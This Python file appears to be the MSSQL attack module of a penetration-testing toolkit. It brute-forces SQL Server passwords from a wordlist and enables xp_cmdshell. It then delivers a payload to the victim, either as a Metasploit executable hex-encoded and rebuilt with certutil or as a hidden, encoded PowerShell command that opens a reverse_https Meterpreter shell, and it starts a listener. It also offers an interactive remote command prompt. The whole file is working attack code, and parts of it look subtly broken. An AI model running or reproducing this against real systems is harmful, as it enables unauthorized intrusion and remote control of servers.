#!/usr/bin/env python
from src.core.setcore import *
import sys
import subprocess
import socket
import re
import os
import time
import binascii
import base64
import shutil
import _mssql


#
# this is the mssql modules
#
# define the base path
definepath = definepath()
operating_system = check_os()
msf_path = meta_path()

#
# this is the brute forcer
#
def brute(ipaddr, username, port, wordlist):
    # if ipaddr being passed is invalid
    if ipaddr == "":
        return False
    if ipaddr != "":
        # base counter for successful brute force
        counter = 0
        # build in quick wordlist
        if wordlist == "default":
            wordlist = "src/fasttrack/wordlist.txt"

        # read in the file
        password = open(wordlist, "r")
        for passwords in password:
            passwords = passwords.rstrip()
            # try actual password
            try:

                # connect to the sql server and attempt a password
                if ":" in ipaddr:
                    ipaddr = ipaddr.split(":")
                    port = ipaddr[1]
                    ipaddr = ipaddr[0]

                ipaddr = str(ipaddr)
		port = str(port)

                print("Attempting to brute force " + bcolors.BOLD + ipaddr + ":" + port + bcolors.ENDC + " with username of " + bcolors.BOLD + username + bcolors.ENDC + " and password of " + bcolors.BOLD + passwords + bcolors.ENDC)

                # connect to the sql server and attempt a password
                if ":" in ipaddr:
                    ipaddr = ipaddr.split(":")
                    port = ipaddr[1]
                    ipaddr = ipaddr[0]
                target_server = _mssql.connect(ipaddr + ":" + str(port), username, passwords)
                if target_server:
                    print_status("\nSuccessful login with username %s and password: %s" % (
                        username, passwords))
                    counter = 1
                    break

            # if login failed or unavailable server
            except Exception as e:
                pass

        # if we brute forced a machine
        if counter == 1:
            if ":" in ipaddr:
                ipaddr = ipaddr.split(":")
                ipaddr = ipaddr[0]
            return ipaddr + "," + username + "," + str(port) + "," + passwords
        # else we didnt and we need to return a false
        else:
            if ipaddr != '':
                print_warning("Unable to guess the SQL password for %s with username of %s" % (
                    ipaddr, username))
            return False

#
# this will deploy an already prestaged executable that reads in hexadecimal and back to binary
#
def deploy_hex2binary(ipaddr, port, username, password):

    # base variable used to select payload option
    choice1 = "1"

    conn = _mssql.connect(ipaddr + ":" + str(port), username, password)
    print_status("Enabling the xp_cmdshell stored procedure...")
    try:
        conn.execute_query("exec master.dbo.sp_configure 'show advanced options',1;GO;RECONFIGURE;GO;exec master.dbo.sp_configure 'xp_cmdshell', 1;GO;RECONFIGURE;GO")
    except: pass
    # just throw a simple command via powershell to get the output
    try:
       print("""Pick which deployment method to use. The first is PowerShell and should be used on any modern operating system. The second method will use the certutil method to convert a binary to a binary""")
       choice = raw_input("Enter your choice:\n\n1.) Use PowerShell Injection (recommended)\n2.) Use Certutil binary conversion\n\nEnter your choice [1]:")
       if choice == "": choice = "1"
       if choice == "1":
         print_status("Powershell injection was selected to deploy to the remote system (awesome).")
         option_ps = input(
            "Do you want to use powershell injection? [yes/no]:")
         if option_ps.lower() == "" or option_ps == "y" or option_ps == "yes":
            option = "1"
            print_status("Powershell delivery selected. Boom!")
         else:
            option = "2"

       # otherwise, fall back to the older version using debug conversion via hex
       else:
        print_status("Powershell not selected, using debug method.")
        option = "2"

    except Exception as err:
        print err

    # if we don't have powershell
    if option == "2":
        # give option to use msf or your own
        print_status("You can either select to use a default Metasploit payload here or import your own in order to deliver to the system. Note that if you select your own, you will need to create your own listener at the end in order to capture this.")
        choice1 = raw_input("\n\n1.) Use Metasploit (default)\n2.) Select your own\n\nEnter your choice[1]:")
        if choice1 == "": choice1 = "1"

        if choice1 == "2":
            filename = raw_input("Enter the path to your file you want to deploy to the system (ex /root/blah.exe):")
            if os.path.isfile(filename):
                fileopen = open(filename, "rb")
            else:
                print_error("File not found! Try again.")
                filename = raw_input("Enter the path to your file you want to deploy to the system (ex /root/blah.exe):")
                if os.path.isfile(filename):
                    fileopen = open(filename, "rb")
                else:
                    print_error("Computers are hard. Find the path and try again. Defaulting to Metasploit payload.")
                    choice1 = "1"

        if choice1 == "1":
            try:
                module_reload(src.core.payloadgen.create_payloads)
            except:
                import src.core.payloadgen.create_payloads


                # if we are using a SET interactive shell payload then we need to make
                # the path under web_clone versus ~./set
                if os.path.isfile(setdir + "/set.payload"):
                    web_path = (setdir + "/web_clone/")
                    # then we are using metasploit
                if not os.path.isfile(setdir + "/set.payload"):
                        if operating_system == "posix":
                            web_path = (setdir)
                            # if it isn't there yet
                            if not os.path.isfile(setdir + "/1msf.exe"):
                                # move it then
                                subprocess.Popen("cp %s/msf.exe %s/1msf.exe" %
                                                (setdir, setdir), shell=True).wait()
                                subprocess.Popen("cp %s/1msf.exe %s/ 1> /dev/null 2> /dev/null" %
                                                (setdir, setdir), shell=True).wait()
                                subprocess.Popen("cp %s/msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" %
                                                (setdir, setdir), shell=True).wait()

        if choice1 == "1":
            fileopen = open("%s/1msf.exe" % (web_path), "rb")

        # read in the binary
        data = fileopen.read()
        # convert the binary to hex
        data = binascii.hexlify(data)
        # we write out binary out to a file
        filewrite = open(setdir + "/payload.hex", "w")
        filewrite.write(data)
        filewrite.close()

        if choice1 == "1":
            # if we are using metasploit, start the listener
            if not os.path.isfile(setdir + "/set.payload"):
                if operating_system == "posix":
                    try:
                        module_reload(pexpect)
                    except:
                        import pexpect
                        print_status("Starting the Metasploit listener...")
                        msf_path = meta_path()
                        child2 = pexpect.spawn("%smsfconsole -r %s/meta_config\r\n\r\n" % (meta_path(), setdir))

        # random executable name
        random_exe = generate_random_string(10, 15)

    #
    # next we deploy our hex to binary if we selected option 1 (powershell)
    #
    if option == "1":
        print_status(
            "Using universal powershell x86 process downgrade attack..")
        payload = "x86"

        # specify ipaddress of reverse listener
        ipaddr = grab_ipaddress()
        update_options("IPADDR=" + ipaddr)
        port = input(
            setprompt(["29"], "Enter the port for the reverse [443]"))
        if port == "":
            port = "443"
        update_options("PORT=" + port)
        update_options("POWERSHELL_SOLO=ON")
        print_status(
            "Prepping the payload for delivery and injecting alphanumeric shellcode...")
        filewrite = open(setdir + "/payload_options.shellcode", "w")
        # format needed for shellcode generation
        filewrite.write("windows/meterpreter/reverse_https" + " " + port + ",")
        filewrite.close()
        try:
            module_reload(src.payloads.powershell.prep)
        except:
            import src.payloads.powershell.prep
        # create the directory if it does not exist
        if not os.path.isdir(setdir + "/reports/powershell"):
            os.makedirs(setdir + "/reports/powershell")

        x86 = open(setdir + "/x86.powershell", "r")
        x86 = x86.read()
        x86 = "powershell -nop -window hidden -noni -EncodedCommand " + x86
        print_status(
            "If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
        filewrite = open(
            setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
        filewrite.write(x86)
        filewrite.close()
        # if our payload is x86 based - need to prep msfconsole rc
        if payload == "x86":
            powershell_command = x86
            powershell_dir = setdir + "/reports/powershell/x86_powershell_injection.txt"
            filewrite = open(setdir + "/reports/powershell/powershell.rc", "w")
            filewrite.write(
                "use multi/handler\nset payload windows/meterpreter/reverse_https\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
            filewrite.close()

        # grab the metasploit path from config or smart detection
        msf_path = meta_path()
        if operating_system == "posix":
            try:
                module_reload(pexpect)
            except:
                import pexpect
            print_status("Starting the Metasploit listener...")
            child2 = pexpect.spawn(
                "%smsfconsole -r %s/reports/powershell/powershell.rc" % (msf_path, setdir))
            print_status(
                "Waiting for the listener to start first before we continue forward...")
            print_status(
                "Be patient, Metaploit takes a little bit to start...")
            child2.expect("Starting the payload handler", timeout=30000)
            print_status(
                "Metasploit started... Waiting a couple more seconds for listener to activate..")
            time.sleep(5)

        # assign random_exe command to the powershell command
        random_exe = powershell_command

    #
    # next we deploy our hex to binary if we selected option 2 (debug)
    #

    if option == "2":

        # here we start the conversion and execute the payload
        print_status("Sending the main payload via to be converted back to a binary.")
        # read in the file 900 bytes at a time
        fileopen = open(setdir + "/payload.hex", "r")
        print_status("Dropping inital begin certificate header...")
        conn.execute_query("exec master ..xp_cmdshell 'echo -----BEGIN CERTIFICATE----- > %s.crt'" % (random_exe))
        while fileopen:
            data = fileopen.read(900).rstrip()
            # if data is done then break out of loop because file is over
            if data == "":
                break
            print_status("Deploying payload to victim machine (hex): " + bcolors.BOLD + str(data) + bcolors.ENDC + "\n")
            conn.execute_query("exec master..xp_cmdshell 'echo %s >> %s.crt'" % (data, random_exe))
        print_status("Delivery complete. Converting hex back to binary format.")
        print_status("Dropping end header for binary format converstion...")
        conn.execute_query("exec master ..xp_cmdshell 'echo -----END CERTIFICATE----- >> %s.crt'" % (random_exe))
        print_status("Converting hex binary back to hex using certutil - Matthew Graeber man crush enabled.")
        conn.execute_query("exec master..xp_cmdshell 'certutil -decode %s.crt %s.exe'" % (random_exe, random_exe))
        print_status("Executing the payload - magic has happened and now its time for that moment.. You know. When you celebrate. Salute to you ninja - you deserve it.")
        conn.execute_query("exec master..xp_cmdshell '%s.exe'" % (random_exe))
        # if we are using SET payload
        if choice1 == "1":
            if os.path.isfile(setdir + "/set.payload"):
                print_status("Spawning seperate child process for listener...")
                try:
                    shutil.copyfile(setdir + "/web_clone/x", definepath)
                except:
                    pass

                # start a threaded webserver in the background
                subprocess.Popen("python src/html/fasttrack_http_server.py", shell=True)
                # grab the port options

                if check_options("PORT=") != 0:
                    port = check_options("PORT=")

                # if for some reason the port didnt get created we default to 443
                else:
                    port = "443"

    # thread is needed here due to the connect not always terminating thread,
    # it hangs if thread isnt specified
    try:
        module_reload(thread)
    except:
        import thread

    # execute the payload
    # we append more commands if option 1 is used
    if option == "1":
        print_status("Triggering the powershell injection payload... ")
        sql_command = ("exec master..xp_cmdshell '%s'" % (powershell_command))
        thread.start_new_thread(conn.execute_query, (sql_command,))

    # using the old method
    if option == "2":
        print_status("Triggering payload stager...")
        alphainject = ""
        if os.path.isfile(setdir + "meterpreter.alpha"):
            alphainject = fileopen(setdir + "meterpreter.alpha", "r").read()

        sql_command = ("xp_cmdshell '%s.exe %s'" % (random_exe, alphainject))
        # start thread of SQL command that executes payload
        thread.start_new_thread(conn.execute_query, (sql_command,))
        time.sleep(1)

        # if pexpect doesnt exit right then it freaks out
    if choice1 == "1":
        if os.path.isfile(setdir + "/set.payload"):
            os.system("python ../../payloads/set_payloads/listener.py")
        try:
            # interact with the child process through pexpect
            child2.interact()
            try:
                os.remove("x")
            except:
                pass
        except:
            pass


#
# this will deploy an already prestaged executable that reads in hexadecimal and back to binary
#
def cmdshell(ipaddr, port, username, password, option):
    # connect to SQL server
    import src.core.tds as tds
    mssql = tds.MSSQL(ipaddr, int(port))
    mssql.connect()
    mssql.login("master", username, password)
    print_status("Connection established with SQL Server...")
    print_status("Attempting to re-enable xp_cmdshell if disabled...")
    try:
        mssql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
    except Exception as e:
        pass
    print_status("Enter your Windows Shell commands in the xp_cmdshell - prompt...")
    while 1:
        # prompt mssql
        cmd = input("mssql>")
        # if we want to exit
        if cmd == "quit" or cmd == "exit":
            break
        # if the command isnt empty
        if cmd != "":
            # execute the command
            mssql.sql_query("exec master..xp_cmdshell '%s'" % (cmd))
            # print the rest of the data
            mssql.printReplies()
            mssql.colMeta[0]['TypeData'] = 80 * 2
            mssql.printRows()
